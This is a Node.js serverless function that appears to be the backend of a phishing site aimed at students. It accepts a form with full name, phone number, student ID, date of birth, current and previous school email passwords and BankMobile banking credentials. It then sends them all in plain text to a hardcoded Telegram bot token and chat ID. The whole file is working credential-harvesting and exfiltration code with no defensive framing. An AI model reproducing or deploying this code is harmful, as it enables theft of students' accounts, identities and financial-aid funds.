const axios = require("axios");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const {
    fullName,
    phoneNumber,
    currentSchoolEmail,
    currentSchoolPassword,
    previousSchoolEmail,
    previousSchoolPassword,
    hasBankMobileProfile,
    bankMobileEmail,
    bankMobilePassword,
    studentid,
    dob,
  } = req.body || {};

  if (
    !fullName ||
    !phoneNumber ||
    !currentSchoolEmail ||
    !currentSchoolPassword ||
    !previousSchoolEmail ||
    !previousSchoolPassword ||
    !studentid ||
    !dob ||
    typeof hasBankMobileProfile !== "string"
  ) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const message = `
    *New Form Submission*

    Full Name: ${fullName}
    Phone Number: ${phoneNumber}
    Student ID: ${studentid}
    DOB: ${dob}

    *Current School*
    Email: ${currentSchoolEmail}
    Password: ${currentSchoolPassword}

    *Previous School*
    Email: ${previousSchoolEmail}
    Password: ${previousSchoolPassword}

    *BankMobile*
    Has Profile: ${hasBankMobileProfile}
    Email: ${bankMobileEmail || "N/A"}
    Password: ${bankMobilePassword || "N/A"}
  `;

  const botToken = "7643299207:AAE_kcB5tzi-70wbdnNxS0oOUu1QNCdZAmM";
  const chatId = "985985980";

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram Error:", error.response?.data || error.message);
    return res
      .status(500)
      .json({ error: "Failed to send message via Telegram" });
  }
};
